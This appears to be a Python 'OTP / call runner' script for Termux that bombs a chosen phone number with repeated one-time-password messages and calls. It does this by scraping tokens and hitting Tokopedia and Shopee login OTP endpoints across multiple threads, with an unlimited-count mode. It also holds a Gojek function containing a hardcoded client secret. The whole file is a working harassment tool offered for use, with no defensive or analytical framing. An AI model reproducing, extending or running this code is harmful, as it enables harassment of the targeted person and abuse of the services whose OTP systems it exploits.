#!/usr/bin/env python3
# file: otp_spam.py
# target: Termux, Python 3.10+
# deps: requests
# owner: @sidzx12
# repo : github.com/sidzx12/otp-runner

import os, sys, re, time, random, string, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

OWNER = "@sidzx12"
DEBUG = True  # set False kalau sudah stabil

BANNER = r"""
   ____        _     ____        _
  / __ \      | |   |  _ \      | |
 | |  | |_ __ | |_  | |_) | ___ | |_
 | |  | | '_ \| __| |  _ < / _ \| __|
 | |__| | |_) | |_  | |_) | (_) | |_
  \____/| .__/ \__| |____/ \___/ \__|
        | |        OTP / CALL RUNNER v2
        |_|        owner: @sidzx12
"""

UA = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    "okhttp/4.12.0",
]

def rand_id(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def norm(raw):
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+"): p = p[1:]
    if p.startswith("0"): p = "62" + p[1:]
    if not p.startswith("62"): p = "62" + p
    return p

def local(p):
    return "0" + p[2:] if p.startswith("62") else p

# ---------------------------------------------------------------- Tokopedia
def tokopedia_otp(phone: str, kind: str = "wa"):
    """
    kind: 'wa' = WhatsApp, 'sms' = SMS, 'call' = voice call
    Endpoint butuh 'tk' token dari GET /otp/c/page dulu.
    """
    p = local(phone)  # 08xxxx
    base = "https://accounts.tokopedia.com"
    ua = random.choice(UA)

    # step 1: GET page, extract tk
    page_url = f"{base}/otp/c/page?otp_type=116&msisdn={p}"
    r1 = requests.get(page_url, headers={
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml",
    }, timeout=10)
    if DEBUG:
        print(f"    [tokopedia] GET page -> {r1.status_code}, len={len(r1.text)}")
    m = re.search(r'name="tk"\s+value="([^"]+)"', r1.text)
    if not m:
        m = re.search(r'"tk"\s*:\s*"([^"]+)"', r1.text)
    if not m:
        return None, "tk token not found (page layout changed)"

    tk = m.group(1)

    # step 2: POST request-wa / request-sms / request-call
    if kind == "wa":
        path = "/otp/c/ajax/request-wa"
        otp_type = "116"
    elif kind == "sms":
        path = "/otp/c/ajax/request-sms"
        otp_type = "116"
    else:
        path = "/otp/c/ajax/request-call"
        otp_type = "116"

    r2 = requests.post(base + path, headers={
        "User-Agent": ua,
        "Origin": base,
        "Referer": page_url,
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }, data={
        "otp_type": otp_type,
        "msisdn": p,
        "tk": tk,
        "email": "",
        "original_param": "",
        "user_id": "",
        "signature": "",
        "number_otp_digit": "6",
    }, timeout=10)
    return r2.status_code, r2.text[:300]

# ---------------------------------------------------------------- Shopee
def shopee_otp(phone: str):
    """
    Shopee butuh csrf token dari halaman login.
    Kalau 403, berarti butuh cookie + csrf yang lebih baru.
    """
    p = local(phone)
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(UA)})
    # warm-up cookie
    s.get("https://shopee.co.id/buyer/login/otp", timeout=10)
    csrf = s.cookies.get("csrftoken", "")
    r = s.post(
        "https://shopee.co.id/api/v4/otp/send_vcode",
        json={
            "phone": p,
            "force_channel": "true",
            "operation": 7,
            "channel": 2,
            "supported_channels": [1, 2, 3],
        },
        headers={
            "X-CSRFToken": csrf,
            "X-Requested-With": "XMLHttpRequest",
            "X-API-SOURCE": "rweb",
            "Referer": "https://shopee.co.id/buyer/login/otp",
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
        timeout=10,
    )
    return r.status_code, r.text[:300]

# ---------------------------------------------------------------- Gojek (sering butuh login token)
def gojek_otp(phone: str):
    r = requests.post(
        "https://api.gojekapi.com/v5/customers",
        json={
            "phone": phone,
            "client_name": "gojek:cons:android",
            "client_secret": "C5E5A2A3B0C3F4D5E6F7A8B9C0D1E2F3",
        },
        headers={
            "User-Agent": "okhttp/4.12.0",
            "X-Platform": "android",
            "Content-Type": "application/json",
        },
        timeout=10,
    )
    return r.status_code, r.text[:300]

# ---------------------------------------------------------------- dispatcher
def send_one(phone: str):
    """Return (status, body) tuple."""
    mode = random.choice(["tokopedia_wa", "tokopedia_sms", "shopee"])
    try:
        if mode == "tokopedia_wa":
            return tokopedia_otp(phone, "wa")
        if mode == "tokopedia_sms":
            return tokopedia_otp(phone, "sms")
        if mode == "shopee":
            return shopee_otp(phone)
        if mode == "gojek":
            return gojek_otp(phone)
    except Exception as e:
        return None, f"EXC: {e}"
    return None, "no mode"

def spam(phone, count, threads, delay):
    total = ok = fail = 0
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        nonlocal total, ok, fail
        while not stop.is_set():
            if count > 0 and total >= count:
                stop.set(); break
            code, body = send_one(phone)
            with lock:
                total += 1
                if code and 200 <= code < 300:
                    ok += 1
                    tag = "OK"
                else:
                    fail += 1
                    tag = "FAIL"
                sys.stdout.write(f"\r[{total}] {tag:4} http={code}   ")
                sys.stdout.flush()
            if DEBUG and (code is None or code >= 400):
                print(f"\n    ↳ {body}")
            if delay > 0:
                time.sleep(delay + random.random() * delay)
            if count > 0 and total >= count:
                stop.set(); break

    print(f"\n[*] target : {phone}")
    print(f"[*] threads: {threads}")
    print(f"[*] count  : {'unlimited' if count == 0 else count}")
    print("[*] Ctrl+C stop\n")

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(as_completed([ex.submit(worker) for _ in range(threads)]))
    except KeyboardInterrupt:
        stop.set(); print("\n[!] stopped")
    print(f"\n[+] sent={total} ok={ok} fail={fail}")

def menu():
    os.system("clear")
    print(BANNER)
    print("  [1] Spam OTP — random service")
    print("  [2] Tokopedia — WhatsApp OTP only")
    print("  [3] Tokopedia — SMS OTP only")
    print("  [4] Shopee — OTP only")
    print("  [5] Settings")
    print("  [6] Exit")
    print(f"  owner: {OWNER}\n")

def main():
    threads, delay, count = 5, 0.3, 0
    while True:
        menu()
        c = input("  menu> ").strip()
        if c == "6": break
        if c == "5":
            t = input("  threads (5): ").strip()
            d = input("  delay (0.3): ").strip()
            if t: threads = max(1, int(t))
            if d: delay = max(0.0, float(d))
            continue
        if c not in ("1","2","3","4"): continue

        phone = norm(input("  phone (08xx): "))
        n = input("  count (0=unlimited): ").strip()
        count = 0 if n == "0" else int(n or "0")

        if c == "1":
            spam(phone, count, threads, delay)
        elif c == "2":
            # only tokopedia wa, loop manual
            total = 0
            while count == 0 or total < count:
                code, body = tokopedia_otp(phone, "wa")
                total += 1
                print(f"\r[{total}] http={code}", end="", flush=True)
                if DEBUG and code and code >= 400:
                    print(f"\n  ↳ {body}")
                time.sleep(delay)
                if count and total >= count: break
            print()
        elif c == "3":
            total = 0
            while count == 0 or total < count:
                code, body = tokopedia_otp(phone, "sms")
                total += 1
                print(f"\r[{total}] http={code}", end="", flush=True)
                if DEBUG and code and code >= 400:
                    print(f"\n  ↳ {body}")
                time.sleep(delay)
                if count and total >= count: break
            print()
        elif c == "4":
            total = 0
            while count == 0 or total < count:
                code, body = shopee_otp(phone)
                total += 1
                print(f"\r[{total}] http={code}", end="", flush=True)
                if DEBUG and code and code >= 400:
                    print(f"\n  ↳ {body}")
                time.sleep(delay)
                if count and total >= count: break
            print()
        input("\n  enter...")

if __name__ == "__main__":
    main()
